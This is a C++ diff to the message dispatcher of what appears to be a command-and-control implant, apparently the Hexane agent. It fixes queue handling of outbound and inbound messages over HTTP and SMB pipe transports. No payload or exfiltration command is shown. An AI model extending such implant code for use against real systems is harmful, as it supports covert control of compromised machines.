@@ -140,7 +140,7 @@ namespace Dispatcher {
             }
             if (head->buffer) {
                 if (head->length + HEADER_SIZE + out->length + 4 > MESSAGE_MAX) {
-                    break;
+                    break; // if the stream if full, exit
                 }
 
                 Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
@@ -164,7 +164,7 @@ namespace Dispatcher {
                 return_defer(ERROR_INVALID_DATA);
             }
 
-            head->self = head;
+            out->self = head;
             head = head->next;
         }
 
@@ -177,7 +177,6 @@ namespace Dispatcher {
         HEXANE
 
         if (in) {
-            RemoveMessage(in->self); // need a pointer to the message we just sent
             if (PeekPeerId(in) != Ctx->session.peer_id) {
                 OutboundQueue(in);
             } else {
@@ -207,11 +206,11 @@ namespace Dispatcher {
             Dispatcher::OutboundQueue(entry);
             goto retry;
 #endif
-        } else {
-            out = Stream::CreateStream();
-            if (!Dispatcher::PrepareEgressMessage(out)) {
-                return_defer(ntstatus);
-            }
+        }
+
+        out = Stream::CreateStream();
+        if (!Dispatcher::PrepareEgressMessage(out)) {
+            return_defer(ntstatus);
         }
 
 #ifdef TRANSPORT_HTTP
@@ -220,6 +219,9 @@ namespace Dispatcher {
         Network::Smb::PipeSend(out);
         Network::Smb::PipeReceive(&in);
 #endif
+        if (out->self) {
+            Dispatcher::RemoveMessage(out->self);
+        }
         Stream::DestroyStream(out);
         Dispatcher::PrepareIngressMessage(in);
 
